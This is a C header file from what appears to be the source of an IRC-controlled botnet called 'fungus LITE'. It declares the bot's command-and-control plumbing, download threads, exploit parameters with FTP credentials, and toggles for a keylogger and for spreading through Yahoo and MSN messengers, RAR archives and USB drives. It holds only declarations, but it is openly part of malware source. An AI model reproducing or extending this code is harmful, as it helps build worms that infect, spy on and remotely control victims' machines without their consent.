/*
   ___                                           
 /'___\                                          
/\ \__/  __  __    ___      __   __  __    ____  
\ \ ,__\/\ \/\ \ /' _ `\  /'_ `\/\ \/\ \  /',__\  by Zax0mA
 \ \ \_/\ \ \_\ \/\ \/\ \/\ \L\ \ \ \_\ \/\__, `\
  \ \_\  \ \____/\ \_\ \_\ \____ \ \____/\/\____/ LITE
   \/_/   \/___/  \/_/\/_/\/___L\ \/___/  \/___/ 
                            /\____/              
                            \_/__/     
							          
*/
#ifndef _shared_h
#define _shared_h





//#define DEBUG

#define NO_KEYLOG
//#define NO_YAHOO
//#define NO_MSN
//#define NO_RAR
//#define NO_USB

#ifdef DEBUG
	#pragma comment(linker, "/subsystem:console")
#else
	#pragma comment(linker, "/subsystem:windows")
#endif





#define MAX_RANDOM_LETTERS		16
#define MAX_LINE				512
#define MAX_RECEIVE_BUFFER		2048
#define MAX_WORDS				64
#define THREAD_WAIT_TIME		30
#define MAX_THREADS				256



typedef enum
{
	MSG_PASS,
	MSG_NICK,
	MSG_USER,
	MSG_PONG,
	MSG_JOIN,
	MSG_PRIVMSG,
	MSG_QUIT
} ircmessage;

typedef enum
{
	NONE,
	T_DOWNLOAD,
    T_YIMFILE,
	T_YIMTEXT,
	T_MSNFILE,
	T_MSNTEXT,
	T_RARWORM,
	T_KEYLOG,
} thread_type;

typedef struct 
{
	char	url[256];
	char	destination[MAX_PATH];
	char	channel[128];
	int		mode;
	SOCKET	ircsock;
	int		tnum;
} download_s;

typedef struct 
{
	char	message[256];
	char	channel[128];
	bool    gotinfo;
	int		mode;
	SOCKET	ircsock;
	int		tnum;
} msn_s;

typedef struct 
{
	char	message[256];
	char	channel[128];
	bool    gotinfo;
	int		mode;
	SOCKET	ircsock;
	int		tnum;
} yim_s;

typedef struct 
{
	char	channel[128];
	int		mode;
	SOCKET	ircsock;
	int		tnum;
} usb_s;

typedef struct 
{
	char	channel[128];
	int		mode;
	SOCKET	ircsock;
	int		tnum;
} KEYLOG;

typedef struct
{
	unsigned long	ip;
	char			ip_char[16];
	char			myip[16];
	unsigned short	port;
	unsigned short	ftp_port;
	char			ftp_user[32];
	char			ftp_pass[32];
	SOCKET			ircsock;
	char			channel[128];
	int				cftp;
} exparam_s;

typedef struct
{
	HANDLE		tHandle;
	thread_type type;
	SOCKET		tsock;
} thread_s;

extern thread_s		threads[MAX_THREADS];
extern char			cfg_servicename[];
extern char			cfg_mutex[];
extern char			cfg_filename[];


// functions
char *nickgen_prefix(char *nick);
unsigned int Resolve(char *host);
char *GetMyIP(SOCKET sock);
char *GenerateRandomLetters(unsigned int len);
HANDLE Thread_Start(LPTHREAD_START_ROUTINE function, LPVOID param, BOOL wait);
void Thread_Clear(int num);
int Thread_Add(thread_type type);
void Thread_Prepare();
int Thread_Check(thread_type type);
int Thread_Kill(thread_type type);


DWORD WINAPI IRC_Thread(LPVOID param);
int IRC_Send(SOCKET sock, ircmessage msg, char *buffer, char *to);
int IRC_Connect(char *host, unsigned short port);

DWORD WINAPI DL_Thread(LPVOID param);

#endif




